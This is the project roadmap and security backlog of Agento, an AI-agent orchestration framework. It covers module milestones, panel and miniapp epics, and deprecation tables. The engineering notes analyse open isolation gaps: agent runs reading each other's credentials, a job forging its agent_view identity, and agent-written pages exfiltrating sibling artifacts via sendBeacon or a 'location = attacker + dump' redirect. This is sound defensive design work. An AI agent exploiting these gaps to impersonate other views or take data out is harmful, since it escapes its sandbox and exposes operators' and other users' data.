# Roadmap

This document expands the roadmap preview in [`README.md`](README.md).

Agento is moving quickly. The list below is directional, not a promise, and priorities may shift as the framework matures and as we learn from real deployments.

The roadmap follows one principle: **the framework provides mechanics, Core defines meaning, and Modules deliver features.** One module equals one integration equals a complete package — channel, workflows, tools, knowledge, and config in a single directory, in the Magento spirit. Two constraints hold across every milestone: the **Python + Node.js split is a security boundary** (credential-handling toolbox code never mixes with agent-execution code), and **every change stays backward-compatible** — no big-bang rewrite, existing tests pass throughout.

Contributions are welcome. Bugs, docs, polish, and tightly scoped improvements are the easiest to merge. If you want to build something bigger, the best path is usually a **module** in `app/code/` — the whole point of the architecture is that a new integration is a directory, not a patch to the framework.

Status legend: ✅ shipped &nbsp;·&nbsp; 🟡 in progress &nbsp;·&nbsp; ⚪ planned

## Milestones

### ✅ Magento-style module system

The foundation. A `modules/` directory where each module carries a `module.json` manifest and `config.json` defaults, a 3-level config fallback (ENV → DB → config.json) shared across Python and Node.js, a scoped `core_config_data` table, cross-language AES-256 encryption, and dynamic tool loading in the toolbox. The CLI (`install`, `reindex`, `module:add/list/remove`, `config:set/get/list`) drives it all.

### ✅ Core contracts & module-driven registries

Hardcoded imports gave way to a module loader that scans manifests and populates every registry — channels, workflows, runtimes — from `module.json` declarations. Core modules (jira, claude, codex) became self-contained packages, the core-vs-user split (`src/agento/modules/` vs `app/code/`) mirrors Magento's `vendor/` vs `app/code/`, and the core protocols (Channel, Workflow, Runner, Publisher) live in `framework/contracts/`. Adding an integration is a directory; removing it cleanly removes its capabilities.

### ✅ Framework kernel & scoped configuration

The `CronConfig` god-object was decomposed so every module declares its own config schema in `module.json` and has it resolved through the same 3-level fallback — Python now matches the Node.js resolver exactly for the same field and fallback chain. Framework config (database, consumer) is separated from module config, and module load order is deterministic via Magento-style `sequence` and `order`.

### ✅ Event–observer system

A Magento-style event-observer layer lets modules react to system events without touching core code — a Slack module can observe `job_fail_after` and post a notification while the Jira module and consumer never learn Slack exists. Observers are declared in `events.json`, execute in deterministic order, and a failing observer never crashes job processing. This is what turns "a codebase with plugins" into "a platform with an ecosystem."

### ✅ Core module refactoring

All business logic moved out of the framework and into core modules — the framework `cli.py` now has zero imports from any module, and modules contribute their own CLI commands and auth strategies through `di.json`. Toolbox JavaScript is co-located with each module (`<module>/toolbox/`), so one module is a complete package across both languages.

### ✅ Module setup system

Modules contribute their own schema migrations (`sql/*.sql`), data patches (`data_patch.json`), and cron jobs (`cron.json`) from their own directory — no framework files touched. A single `setup:upgrade` command applies everything in dependency order, with `--dry-run` to preview all pending work grouped by type.

### ✅ Workspace & agent-view hierarchy

First-class `workspace` and `agent_view` scopes let one installation host many agent profiles with config inheritance (`agent_view` → `workspace` → `global`). Each agent_view can override model, personality, MCP servers, and tool bindings, and agento generates the native CLI config files (`.claude.json`, `.mcp.json`, `.codex/config.toml`) from resolved scoped config before every run — no more hand-edited workspace files.

### ✅ Concurrent agent-view execution pool

A bounded worker pool runs many jobs in parallel, mixing different agent_view profiles — a `developer` on Codex, a `team-leader` on Claude Opus, a `qa-tester` on Sonnet — at the same time. Each run gets an isolated working directory with freshly generated config, priority-ordered claiming (`priority DESC, created_at ASC`) keeps urgent work ahead of bulk QA, and a failing worker fails only its own job instead of taking down the consumer.

### ✅ Ingress identities & agent resolution

Inbound Outlook, Teams, and API traffic maps deterministically to the right agent_view through a module-extensible router registry. Routing is debuggable — matched router, candidates, chosen agent_view, and reasoning are logged and emitted as events — and ambiguity is always surfaced explicitly, never resolved silently.

### ✅ Composable workspace, skills & tools

CLI-managed control over what each agent_view can do: `tool:enable`/`tool:disable`, a skills module (`skill:sync/list/enable/disable`) backed by a registry, and pre-built materialized workspaces per agent_view (`workspace:build`) so the consumer copies a ready build instead of regenerating identical files on every run. Three independent deliverables, each disableable without breaking the system.

### ✅ Versioned artifacts

Generic versioned file/directory trees: mutable **drafts**, immutable **versions**, and an atomic
**current** pointer, backed by local Git that never surfaces in the public contract. Shipped as the
core module `versioned_artifacts` (eleven opt-in MCP tools covering the whole lifecycle, with
`artifact:init` / `artifact:list` / `artifact:publish` as equivalent operator commands and
`artifact:delete` as an operator-only one), with a toolbox-only storage volume, per-`agent_view`
artifact allowlist, filesystem locking, crash recovery and a `versioned_artifact_audit` trail. A
separate `artifacts` container serves the published tree on loopback, and disabling the module makes
it answer 503. See
[docs/modules/versioned-artifacts.md](docs/modules/versioned-artifacts.md). Deferred: garbage
collection of Git objects (immutable versions and `audit-fallback.log` both grow without bound, though
materialized previews have a retention policy on by default via `serving/keep_versions`, `10`),
human-in-the-loop publication approval, an annotated tag object per version so a version carries its
own label, and multiple toolbox instances per `storage_root` — which needs a real distributed lock,
see DECISIONS.md.

### 🟡 Developer experience & open-source polish

Getting a contributor from "I want to add a Slack integration" to a working module in under 30 minutes. The unified Python CLI, `doctor`, `init`, `make:module`, and `module:validate` are shipped; what remains is per-capability extension docs, architecture tests that enforce module boundaries in CI, and a log-safety audit before widening logging namespaces.

### 🟡 Event coverage & naming convention

The `{subject}_{verb}_{before|after}` naming convention is established, with event classes covering job, consumer, worker, agent_view, routing, config, setup, and migration lifecycles. Remaining events are added incrementally as later milestones introduce the features they describe (for example, tool-binding change events).

### 🟡 Composable workspace automation

Makes composable workspaces production-ready. Shipped: builds detect config drift and rebuild themselves at job-claim time (a checksum freshness check that supersedes the original dirty-flag design), and old builds are garbage-collected under a retention policy. Still pending: runtime-directory GC and a periodic `skill:sync` + `workspace:build --all` cron so skill-content changes are picked up on a schedule.

### ⚪ Panel, RBAC and miniapps (E0 contracts agreed)

E0 is the contract round for the user-facing platform: logging in, talking to an agent, running a
versioned miniapp, and letting that miniapp perform allowed toolbox operations — deterministically,
with no LLM in the path. The contracts were agreed on 2026-09-24 and the decisions are in
[DECISIONS.md](DECISIONS.md). The detailed PRDs are deliberately **not** in this repo; they sit
beside it, outside version control, as:

- `PRD-E1-toolbox-auth-and-tool-execution.md` — auth context v1, per-call authorization, one
  MCP/HTTP dispatcher (`POST /internal/tools/{name}:invoke`), transport rules, rollout order.
- `PRD-E1.5-platform-foundation.md` — extra scope inside E1: all Compose changes and the
  already-specified framework schema, front-loaded so the later epics stop colliding.
- `PRD-E2-admin-panel-rbac.md` — Web API, sessions, `admin`/`user` roles, the `web` and `proxy`
  Compose services, the panel/apps origin split.
- `PRD-E6-miniapps-va-artifacts.md` — the Miniapps module over Versioned Artifacts, launch pinning,
  proxy-subrequest file authorization, the SDK bridge, the Basic-auth share origin.

Order: **E1 (including E1.5) → then E2, E3–E5 and E6 in parallel → E7 (administration)**.

The original chain was E1 → E2 → E3–E5 → E6 → E7, but two of its links were collision hazards rather
than real dependencies: `docker/docker-compose.yml` is generated from shared templates, and framework
migrations are one global sequence, so every parallel track races for the next free number. E1.5 does both once, up front, in a single track; afterwards the epics touch disjoint
files. Module migrations are numbered per module, so an epic that puts its tables in its own module can
never collide with another's.

E1.5 deliberately stops short of schema for unspecified epics — the conversation model and the miniapp
manifest stay with E3–E5 and E6, because designing them before those epics exist buys a migration. E7
stays last regardless: it needs E2's RBAC enforcement, not just its tables.

The E1 core (PRD E1 §3–§8) is built; E1.5 is the next track: auth context v1, the `user_session`/`miniapp` profiles (invoke only, refused until E2/E6
install a source checker), one dispatcher with per-call checks and a `tool_invocation` audit row,
and header tokens on `/mcp`. See [docs/architecture/auth-context.md](docs/architecture/auth-context.md).

E2 shipped the panel API: users, sessions, `admin`/`user` roles with per-scope grants, per-call
`user_session` capabilities, and the launch exchange that authorizes files on the apps origin
([docs/architecture/panel.md](docs/architecture/panel.md)). Left out of E2:

- an admin-TUI users screen (the panel frontend shipped in E8, below);
- per-user grants (visibility is per role), and `operation` grants beyond `artifact.launch`;
- a DB-backed login throttle (the current one is per process);
- rate limits for the launch redeem and `/internal/authz/app` (RULES.md SEC-12; see the zero-trust.md debt row);
- a sequence column for exact launch eviction order (`created_at` has 1 s precision);
- **per-run UID or container isolation (OPEN)**: until it exists, panel roles do not separate users
  from what a shell-capable agent can read on the shared mount
  ([docs/deployment/panel.md](docs/deployment/panel.md)).

E8 shipped the composable frontend: a static React panel served by `proxy`, the `@agento/ui`
components over one token source, the miniapp kit at `/_ui/<version>/` and the generated
`miniapp-ui` skill ([docs/development/frontend.md](docs/development/frontend.md)). It added no
backend route, so these gaps stay open, each needing a route first:

- **conversation messages are not paged**: the messages route answers the oldest 100 rows and takes
  no `after`, so a long thread shows only its start;
- **no module list for the panel**: there is no `GET /api/admin/modules`, so the navigation knows a
  module only through its own probe route (fail closed: a module with no GET route has no screen);
- ~~**no config screen**~~ — done 2026-10-02: the admin TUI screens are in the panel
  (`/api/admin/*`, [docs/architecture/panel.md](docs/architecture/panel.md#admin-screens)). Left
  TUI-only, each a follow-up:
  - **secret writes** (`obscure`, `toolbox_only`): `web` holds no key; needs the credential broker
    below, or a toolbox write route;
  - **`CONFIG__*` ENV visibility**: `web` does not load the cron store, so the panel cannot show an
    `env` source;
  - **job replay and workspace build**: both run in the cron container; a panel button needs a
    queued request that cron picks up;
  - **`local`-kind testers**: `web` does not load module code;
  - **a `config_delete_after` event**: no remove path dispatches one (CLI, TUI, panel);
  - **kit `.ag-badge` in a narrow table cell**: like `StatusBadge`, it is cut to "S…" (`overflow:
    hidden` in a grid); the panel keeps its table badges whole at the cell (`whole()`), the kit needs
    `min-width: max-content` on both twins in a new kit version (UI-2, UI-3);
- **no `job.succeeded` event**: a turn's success is read from the assistant message that follows it;
- **no snapshot watermark**: a REST snapshot carries no stream event id, so the panel refetches on
  every stream (re)open instead of resuming exactly;
- **the release must build the frontend**: CI and `release.yml` run `npm ci && npm run build`
  before `uv build`, and the wheel hook refuses a wheel without the panel.

### 🟡 Conversations, history and chat (E3–E5)

The `conversation` module: threads, idempotent submission, executions, the durable
`conversation_event` log with cursor replay, SSE, `§4.5`'s unblock route, and the framework seams
those need — route registration, streaming responses, the pre-claim hook, the three execution
protocols and the delta sink, and the rate limiter. See
[docs/architecture/conversations.md](docs/architecture/conversations.md) and
[docs/modules/conversation.md](docs/modules/conversation.md).

Known gaps, each deliberate:

- **The open-cursor guarantee is withdrawn.** The PRD's earlier draft promised that any cursor a
  client ever held would still replay. `§10.1`'s age prune makes that unkeepable: a cursor at or
  below a thread's prune watermark is **expired**, answered `409 cursor_expired` on the replay route
  and as one `cursor_expired` SSE frame (before any event frame) on a reconnect. A client that sees
  it restarts from the newest page. History that has been pruned is gone, and saying so is the
  guarantee — silently serving the survivors as if they were the whole thread is not.
- **F14 — the Node job insert emits no event.** `src/agento/modules/core/toolbox/schedule.js`
  writes to `job` directly from the toolbox, so a job scheduled by a tool never reaches
  `publish_service` and never dispatches `job_publish_after`. Nothing relays it into a thread. Give
  the toolbox a publish path that goes through the framework, or have it write the outbox row too.
- **E9 left out (PRD `E9-conversations-deep-research-report.md`).** E9 shipped the live path:
  a `stream_event_mapper` per harness, channel threads for every non-panel job, the timeline
  route and the panel timeline ([docs/architecture/conversations.md](docs/architecture/conversations.md)).
  Deferred, each with its PRD section:
  - `SessionReader`: import of native session files (`~/.claude/projects`, codex rollouts, pi
    sessions), lazy backfill and "discover unmanaged sessions" ("Historical read-through
    fallback"). Runs before E9 keep their stored messages only.
  - Pi branch UI and the `native_parent_id` tree ("Pi branches").
  - Replay mode at 0.5×/1×/2× ("Replay").
  - Row virtualization past 100k events (the panel keeps at most 5000 loaded events).
  - Metrics and OpenTelemetry counters ("Observability").
  - Channel threads for non-admins through role grants, a `conversation:raw` permission split,
    and full-text search (D-E9-3 is a proposal the owner has not decided).
  - Writing into a channel thread from the panel (reply to Jira/Outlook, resume a channel run).
  - Per-harness feature flags (disabling a module or shipping no mapper is the off switch today).
  - Long-polling: the REST poll stays the fallback.
- **E9 chat UX left out (2026-10-06).** The chat UX pass shipped token streaming for claude and pi
  (coalesced partials), the reasoning fragment, tool summaries, the status line, the
  `conversation.run_details` ACL resource and server titles. Left out:
  - A Stop button and edit-and-resend (they need the E7 stop request), and regenerate.
  - Per-user grants (grants stay per role).
  - Lighter Markdown tables (they need `.ag-prose` and a new kit version).
  - Codex token streaming: `codex exec --json` sends no partial text.
  - Deleting partial rows after a run: retention prunes them with the rest of the thread.
  - Claude reasoning text: the claude CLI sends thinking blocks with empty text, so the panel
    shows "Thought" with no body until the CLI gives a way to show it.
- **The `§4.5` audit ordering is E7's.** The framework's audit writer must be called from inside
  `service.unblock()`'s transaction, not from an observer and not with module SQL.

E6 shipped the `miniapps` module: the strict `miniapp.json` manifest, operator activation,
launch pinning of the manifest and its actions, the `launch` auth source, single-use `miniapp`
capabilities with a tool ceiling, the `postMessage` SDK bridge, Basic-auth shares on one origin per
share, the strict one-parse apps path, and retention that keeps what a live launch pins
([docs/modules/miniapps.md](docs/modules/miniapps.md)). Left out of E6:

- a panel frontend that uses the bridge (the SDK ships as a library with tests);
- an `artifact:share` command separate from `artifact:auth` (setting Basic auth makes the share);
- a per-launch revoke when a manifest is re-activated (a launch with a stale fingerprint just loses its actions).

### ⚪ Per-artifact origins for miniapps

The agreed E0 design puts every miniapp on **one shared apps origin**, separate from the panel
origin. That split is what stops agent-generated code from **reading** panel data — panel API responses, panel DOM, the
panel session cookie. It is not by itself write protection: sibling subdomains are same-site, so an apps page can still
*cause* a credentialed panel request. Blocking that needs separate CSRF controls (`Origin`/Fetch-Metadata checks, an
anti-CSRF token, no credentialed CORS), specified in the E2 PRD. What the split also does not give is isolation
**between** apps: same-origin script in one miniapp can read another's
DOM, storage and cached credentials. This is an accepted trade — one DNS name, one certificate —
and it holds only while every artifact reachable from a session is one that user could open anyway.

The upgrade is one origin per artifact (`<code>.apps.example.com` plus a wildcard certificate). It
is blocked on artifact codes becoming valid DNS labels: `ARTIFACT_CODE_RE` in
`src/agento/modules/versioned_artifacts/toolbox/paths.js` allows 64 characters and a trailing
hyphen, both illegal in a label. Until then app identity is path-derived, not host-derived. This
supersedes the "one origin per artifact" note at the end of the Versioned artifacts section, which
proposed the same fix for the sibling-read problem on the artifacts server itself.

### ⚪ Stale internal-caller-auth wording, to sweep when PR #42 merges

PR #42 (`AG-16`, toolbox east-west capability auth) closes the N5-2 gap where the toolbox took
`agent_view_id` from the caller. Several documents still describe the pre-#42 world. They are
**deliberately not corrected yet** — this branch does not contain #42's code, and editing them now
would make the repo describe code that is not here.

When #42 merges, run:

```bash
rg -i 'internal-caller[- ]auth|N5-2' src/ docs/ *.md
```

Deliberately no expected hit count: this very section matches the search, so any number written here is wrong as soon
as the surrounding text is edited. Read the hits. At the time of writing they are confined to `DECISIONS.md`,
`ROADMAP.md`, `docs/modules/github.md` and `docs/modules/bitbucket.md`. The edit rule differs by kind of text:
**current-state** prose is corrected in place; a **historical** decision entry is left standing and
given a `Superseded by` line — a decision log that rewrites its own past stops being evidence.

### ⚪ Admin API & Agent Studio

A minimal but real control plane so operators can create workspaces and agent_views, manage scoped config overrides, attach tools from the toolbox, and manage allowlists without hand-editing JSON or SQL. API-first and binding-based — the admin frontend is a client of the API, and the same DB source of truth backs API, CLI, and runtime.

### ⚪ Credential broker / key vault

A dedicated broker service that owns secret storage: admin writes secrets, toolbox reads them with scoped broker tokens, and agent-execution runtimes never get direct vault access by default. Config stores secret references rather than raw values, and external backends like Azure Key Vault stay optional adapters, not MVP requirements.

### ⚪ Multi-language platform

The admin panel, the TUI and the agent output in more than one language. Today the panel and the
CLI speak English and the prompts that conversations and channels send to the agent are Polish
(`=== WĄTEK ===`, `Użytkownik`/`Asystent` in `modules/conversation/src/workflow.py`); the owner
keeps them Polish until this milestone (2026-10-06). Scope: message catalogues for the panel and
`system.json` labels, a per-user UI locale, and prompt templates per locale. The agent's reply
language is the [Response locale policy](#-response-locale-policy) below.

### ⚪ Response locale policy

Per-workspace and per-agent_view control of the language agents reply in — `preserve_input_language` or `force_output_locale` — as part of effective agent configuration, without opaque pre-translation steps. Full admin and module i18n is explicitly a later nice-to-have, not part of this milestone.

### ⚪ OAuth token pools

Group multiple tokens from the same provider into pools with capacity-based rotation and per-agent_view pool assignment, replacing direct per-provider token selection. `TokenResolver` stays the single extension point, so pool-aware selection needs no consumer changes.

### ⚪ Credential limits and panel re-login — follow-ups

Phases 3–4 of the panel improvements (DECISIONS.md 2026-10-04) shipped OAuth re-login and
limits. Still open:

- **API-key re-login from the panel.** Today an API key is replaced only with
  `credential:register --with-api-key`. A panel form needs the same per-login sealing as the code.
- **TUI module titles.** The admin TUI shows module ids where the panel shows titles.
- **`codex_access_token` limits.** `fetch_limits` covers Codex `oauth` only; an access-token
  credential stores "no data".
- **Limits for an idle OAuth credential.** Only a run renews an OAuth access token, so
  `credential:limits` skips a credential whose token has expired and keeps its last result. To show
  fresh limits with no runs, the job must renew the token itself under the same exclusive refresh
  lease a run takes (refresh tokens are single-use), as CodexBar does.
- **Live check of re-login.** The usage endpoints were checked live on 2026-10-05 (Claude and
  Codex OAuth, OpenRouter). A finished re-login is not: check that Claude writes its credentials
  into the temp `HOME` after a pasted code.

### ⚪ Distribution & installation model

`agento install && agento up` should start a working system from pre-built, versioned images with no local Docker build. This decouples the lean cron image from the full agent sandbox, makes builds reproducible via lockfiles and digest-pinned base images, and separates the dev compose (bind-mounts, local builds) from the customer compose (GHCR images, data-only mounts). Independent of the other milestones — it can land in parallel with any of them.

### ⚪ Observability, telemetry & evals

Emit OpenTelemetry traces across the whole job flow — one `correlation_id`/`job_id` from ingress through runner execution, MCP tool calls, and HITL decisions — with Agento events mapped to spans. Telemetry ships as an optional module, not a hard core dependency, with any eval/observability backend (LangSmith, for example) as a pluggable exporter whose credentials stay in the cron/toolbox/collector and never reach the sandbox. On top of the traces: build eval datasets from historical production jobs and run offline/online evals as a regression gate for prompts, policies, and routing before a release.

### ⚪ Dynamic harness/model/effort routing

Today an agent_view is statically bound to a harness, model, and effort. This adds an optional pre-execution assessment step that picks harness/model/effort per job from an ordered rule set (`When → Harness → Model → Effort`, with a mandatory default row), so simple jobs run cheap and hard ones get a more capable model. Delivered as an independent `dynamic_routing` module behind a `static`/`dynamic` switch, leaving the existing static binding as the default.

### ⚪ Job threads, handoffs & shared artifacts

Group related jobs into a thread so agents can collaborate the way people do: an agent does work locally, publishes it, and hands off to another agent for review, decision, or continuation, escalating to a human when they can't agree. The core primitive is a **handoff package** — intent, origin, a work summary, and an artifact manifest — that travels between agent_views, giving a thread a shared workspace and shared, runnable artifacts instead of isolated per-job directories.

### ⚪ Areas / selective module loading — parked

Explicitly parked. There is no current justification for selective module loading, and security boundaries stay enforced by process and container separation rather than area declarations. Revisit only if module count creates measurable overhead, deployments need materially different module subsets, or selective loading solves a proven security problem better than the existing boundaries.

### ⚪ Declarative schema (`db_schema.json`) — deferred

A future declarative alternative to imperative SQL migrations: a module declares its desired tables, columns, and indexes, and `setup:upgrade` converges the actual schema to match (Magento's `db_schema.xml` equivalent). Deferred until hand-writing sequential migrations becomes a maintenance burden, or third-party modules need schema portability across database versions.

---

## Engineering notes

The milestones above are the product view. The sections below are the living operational record behind them — principles the codebase holds itself to, and specific backlog items with owners and deadlines. They are intentionally more detailed than the roadmap itself.

### Anti-patterns to avoid

1. **Don't split integrations into typed micro-modules** — one `jira` module, not `channel-jira` + `tool-jira` + `workflow-jira`.
2. **Don't copy Magento's XML hell** — `module.json` is the only manifest; keep it simple.
3. **Don't build a DI container** — Python's import system plus constructor injection is enough.
4. **Don't add an interception/plugin system** — events for cross-cutting concerns, direct code for main logic.
5. **Don't spread global state** — no "current module" singletons without explicit context.
6. **Don't over-abstract early** — each milestone is motivated by a real need, not a hypothetical future.
7. **Don't merge Python and Node.js** — the two-language split is a security feature, not tech debt. Toolbox (credentials, MCP) stays Node.js; cron (consumer, workflows, channels) stays Python. The language boundary prevents accidentally mixing credential-handling code with agent-execution code.
8. **Don't treat loading profiles as security controls** — isolation comes from containers, process boundaries, permissions, and secret handling.
9. **Don't break existing tests** — backward compatibility in every change.

### Success metric

The roadmap succeeds when this works with no framework files touched and no PR to the main repo — just a module directory in `app/code/`:

```bash
bin/agento make:module slack
# ... implement SlackChannel, SlackWorkflow, slack tools ...
# ... declare everything in one module.json ...
bin/agento config:set slack/webhook_url https://hooks.slack.com/...
bin/agento reindex
docker compose restart
# Slack integration is live — channel, workflows, tools — from one module directory
```

### Security hardening backlog

- **Toolbox-only secret boundary in Python bootstrap** — **PARTIALLY DELIVERED (2026-08-23).**
  `bootstrap` still transiently decrypts DEFAULT-scope `obscure` config in the cron/consumer/CLI —
  but **not** for a field declaring `access: "toolbox_only"`, which the Outlook Graph credentials
  now do. What remains open is item 3 of the PRD: `app_monitor` consumes its obscure SMTP password
  cron-side to send breach alerts, so it needs a toolbox transport before it can be marked the same
  way. Design + scope in
  [docs/security/toolbox-only-secret-boundary.md](docs/security/toolbox-only-secret-boundary.md).
  Surfaced by the Outlook sender-routing review (2026-07-24) as pre-existing and out of scope for
  that feature.
- **Per-run identity boundary for the sandbox (the segmentation half of the toolbox east-west work)**
  — **OPEN.** Capability tokens stop a caller from *asking* for another view's scope, but every agent
  process the consumer spawns runs as the same `agent` account and the cron container mounts the whole
  workspace, so one concurrent run can read another run's live token out of its MCP config and
  authenticate as that view. Directory-per-run is not an identity boundary and file modes cannot make
  it one. Closing it needs a distinct UID per run or a container per run. Until then, concurrent runs
  in one deployment are mutually trusting — documented in
  [docs/architecture/zero-trust.md](docs/architecture/zero-trust.md).
- ~~**A distinct OS uid per agent_view (Option B of D-SSH-1)**~~ — **cancelled 2026-09-23.**
  agent_views sharing `/workspace` files is a wanted property (it is how a task is handed from one
  view to another), so per-view uids are not going to be built. What Option B was carrying —
  D-SSH-1 residual channel (6), the credential store reachable by any process at uid `agent` — was
  closed instead by **V0**: the store is taken away from the shared uid (root-owned
  `/opt/cron-agent`, a `0600` store file delivered on a file descriptor, a root-owned `setpriv`
  launcher, and a root-rendered crontab). See
  [docs/architecture/cron-privileges.md](docs/architecture/cron-privileges.md) and `DECISIONS.md`
  D-SSH-1. The peer-**artifact** reads Option B would also have closed remain open and accepted:
  one uid, one `/workspace`.
- **Per-field `toolbox_only` exclusion in the config resolver** — **DELIVERED (2026-08-23).**
  `system.json` now carries `"access": "toolbox_only"` and `"allowEnv": false` per field. Python's
  `resolve_field` returns `None` for a `toolbox_only` field, `ScopedConfigService.get()` raises on a
  direct read, the bulk `resolve_all()` skips it, and `module:validate` fails a deploy that sets a
  `CONFIG__*` override for an `allowEnv: false` field. Both resolvers (Python and toolbox JS) enforce
  the same two keys. The `github` `env_guard` is no longer the only remedy.
- **Internal-caller auth for the toolbox (N5-2)** — **capability half DELIVERED (2026-08-23); the
  co-tenant half stays OPEN** (see the per-run identity boundary entry). Every MCP session and
  every `/api` route now needs a **capability token**; the scope (`agent_view_id`, `job_id`) is read
  from the `toolbox_capability` DB row, never from a query string or a request body. A caller may
  still send `agent_view_id` in a body, but it is only ever compared with the capability's own scope —
  a mismatch is refused. Applied once for all four modules, as the entry required. Rationale (why a
  DB-backed capability and not a shared HMAC secret, and why network segmentation alone was rejected)
  is in [DECISIONS.md](DECISIONS.md).

### Deprecation removals due in v0.17 or later

| Shim | Where | Remove when |
|---|---|---|
| `workspace:ssh-purge` command (+ its `wo:sp` shortcut) | `workspace_build/src/commands/ssh_purge.py`, `workspace_build/di.json` | every deployment has upgraded past the release that stopped writing `ssh_private_key` to disk and has run the sweep once. Nothing on this code writes a key file, so the command then has nothing to find. Delete the command, its `di.json` entry, its tests, and the doc sections in `docs/cli/workspace-build.md` / `docs/cli/README.md` / `docs/config/identity.md`; keep `find_private_keys` only if `workspace:build`'s own legacy pruning still uses it |

### Deprecation removals due next release (v0.16)

Introduced by the harness/provider split (see
[DECISIONS.md](DECISIONS.md#2026-08-04--one-closed-agentprovider-enum-split-into-harness--provider--model)).
Each is a one-release compatibility shim; remove all of them together.

| Shim | Where | Remove |
|---|---|---|
| `token:*` CLI aliases (hidden) | `framework/cli/credential_aliases.py` | delete the module + its registration |
| `--agent-type` alias on `credential:list` / `credential:usage` | `framework/cli/credential.py` | drop the hidden `add_argument` |
| `agent_type` in `--json` output alongside `scope` | `framework/cli/credential.py` | drop the duplicate key |
| `token_id` in `agent_view:prepare-run` payload alongside `credential_id` | `agent_view/src/commands/prepare_run.py` | drop the duplicate key |
| `Token*Event` payloads + `token_*` event names | `framework/events.py` (`_CREDENTIAL_EVENT_ALIASES`, `dispatch_credential_event`) | delete the alias map; dispatch once |
| `credential.agent_type` column (dual-written with `scope`) | migration | drop the column once no deployment reads it |
| Top-level `sandbox_packages` array in `di.json` | `framework/harness/manifest.py` (`_parse_legacy_sandbox_packages`) | delete the legacy parser |
| `--oauth_token` flag alias (`agento replay`, `agento e2e`) | `framework/cli/runtime.py` | drop the second flag name |
| `_iter_module_dirs` shim | `framework/cli/_provisioning.py` | callers use `framework/module_discovery.py` |
| Pre-0.15 `agent_view/provider`-as-harness fallback | `framework/agent_view_runtime._resolve_harness_and_provider` | keep until the data patch has demonstrably run everywhere; then delete the legacy branch |
| `--pass` on `artifact:auth` (argv lands in shell history; use `--pass-stdin`) | `versioned_artifacts/src/commands/auth.py` | drop the flag and its warning |

### No per-job isolation inside the consumer process (raised during AG-50)

`consumer.py:204-206` runs jobs as threads in one process, and `run_preparation.py:153-162`
puts each run's credential in the directory that is also its `HOME`. One job can therefore
read another job's desk and another job's credential. Delegation — one agent scheduling
work for another — makes concurrent jobs the normal case rather than the exception, so this
moves from "theoretical" to "the default shape of a run".

### `schedule_agent_job` needs framework support, not a module workaround (raised during AG-50)

Scheduling a job for *another* agent needs a `job.type` widening plus an opened `AgentType`
(`framework/job_models.py:17-21`, `bootstrap.py:255`), and `publisher.publish()` must learn
`context` and `parent_id` (`publisher.py:84-93` writes neither). A module that
re-implements dedupe-then-insert against the `job` table instead is a second write path to
the queue.

**`schedule_followup` must not be widened to cover this.** Its idempotency key
`followup:{source}:{reference_id}:{minute}` (`schedule.js:91`) collapses a two-agent
fan-out in the same minute into one job — and reports success.

As of the conversations epic the Python side has exactly ONE insert into `job` —
`publisher.insert_job()`, which both `publisher.publish()` and `publish_service.publish_job()`
call — plus `framework/e2e.py` for the smoke stack. `schedule.js` remains the second write
path, in the toolbox, in another language, with its own dedupe. `grep -rn -i "insert into job"
src/agento` is the check; a fourth hit is the bug this entry is about.

### Ungated Toolbox REST endpoints (raised during the Pi harness work)

`registerModuleRestApis` registers `POST /api/jira/request`, `/api/jira/search`,
`/api/jira/issue/comments`, `/api/bitbucket/verify` and `/api/outlook/delta` with
`isToolEnabled` **undefined** (`toolbox/config-loader.js`) — no opt-in, no agent_view
scope, no binding to a job. `/api/jira/request` is a generic Jira proxy. These are
reachable from any sandbox over the shared docker network, for **every** harness, and they
bypass the `is_enabled` allow-list that governs every MCP tool.

Not caused by the Pi work and deliberately out of its scope, but it is a real gap in the
opt-in tool model and wants its own decision: either gate them behind `isToolEnabled` like
the MCP tools, or remove them if the MCP path has superseded them.

**Raised again by AG-50 (`versioned_artifacts`):** agent_view identity on that listener is
**self-asserted** — `src/agento/toolbox/server.js:95` reads `agent_view_id` from a query
parameter supplied by a config file that lives in the job's own writable artifacts
directory. That makes it the ceiling on every per-agent_view gate, `allowed_artifacts`
included: a job that edits its own config can present any agent_view it likes. The fix is
session-bound identity in the framework, never a module-local caller check.

**Widened by the AG-50 follow-up** that gives the agent the whole artifact lifecycle: the
`owner` marker `init` writes beside each artifact records that same self-asserted
value, so it SCOPES cooperating views and does not authorize them — a forged id reaches
another view's artifacts and its per-view creation quota. Shipping it this way was the
deliberate choice (the alternative markers are all forgeable through the same parameter);
what closes it is the session-bound identity above, and nothing below it.

Two more gaps the same change makes reachable without an operator, neither of them new:
- **Nothing bounds disk.** `limits/max_agent_artifacts` bounds artifact count. Versions are
  unbounded, every save materializes a full copy into the published tree, and
  `serving/keep_versions` now defaults to `10`, which bounds the previews per artifact but not
  the store: immutable versions still accumulate forever. The rest belongs with the GC deferral
  in the Versioned artifacts milestone.
- ~~**No `artifact:delete` exists**, so the creation cap is a one-way ratchet.~~ **Shipped
  2026-09-15** — `artifact:delete` removes both roots and the row under the init lock, CLI only.
  The cap is still a lockout of every other view until an operator runs it.

Also unclosed on the serving side: `artifacts-server.js` answers `/` with an index of every
artifact code, and agent-authored HTML now reaches that port with no operator step. Same-origin
script in one artifact can therefore enumerate and read every other artifact in the operator's
browser, and `navigator.sendBeacon` carries it out — the operator's browser is the one route
off that container. `X-Content-Type-Options: nosniff` shipped with the lifecycle change; the
same-origin read did not. Restricting the `/` index instead needs per-caller identity the
server deliberately does not have, and the compose healthcheck fetches `/` and expects it to
answer.

**Analysed 2026-09-15, deliberately not shipped.** A `Content-Security-Policy: sandbox
allow-scripts` header does close the sibling read — the page gets an opaque origin, so the
`/` index tells it nothing it can then fetch. It has two costs that make it the wrong default:

- `<script type="module">` and `@font-face url()` are **CORS-mode** fetches. From an opaque
  origin they need an `access-control-allow-origin` the server does not send, so they fail
  **silently** — a blank page and nothing in the terminal. Every Vite build and every
  self-hosted-font site breaks that way, which is the use case the lifecycle change exists
  for. Classic `<script src>`, `<link rel=stylesheet>` and `<img>` are `no-cors` and still
  load, so a plain static site is fine. Adding `access-control-allow-origin: *` fixes the
  module scripts and reopens the sibling reads — on one origin, same-origin data and sibling
  data are one capability.
- `sandbox` does not stop top-level self-navigation: `location = attacker + dump` still runs.
  The win is only that `dump` cannot hold a sibling artifact.

There was also no place to put the switch: the `artifacts` container carries no `env_file:`,
no `environment:` and no database by design, so a `serving/csp` config key is unreachable
there. The header would have to be hardcoded.

The fix that costs nothing at runtime is **one origin per artifact** — route by `Host`
(`<code>.localhost:8080`), so each artifact keeps full same-origin capability and the browser
itself denies the cross-artifact read. It changes `preview_url`, and Safari does not resolve
